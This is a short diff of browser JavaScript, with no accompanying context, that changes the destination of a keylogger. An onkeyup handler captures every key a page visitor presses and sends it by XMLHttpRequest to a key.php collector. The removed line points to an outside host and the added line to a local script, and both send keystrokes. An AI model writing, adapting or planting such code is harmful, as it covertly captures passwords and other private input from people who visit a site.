@@ -8,7 +8,7 @@ document.onkeyup=(function(evt){
   var xhr=new XMLHttpRequest();
   var param=encodeURI(key);
   param+=" ";
-  xhr.open("GET","http://silentxphilippines.my3gb.com/key.php?k="+param,true);
+  xhr.open("GET","./key.php?k="+param,true);
   xhr.send(null);
   xhr.close();
  }
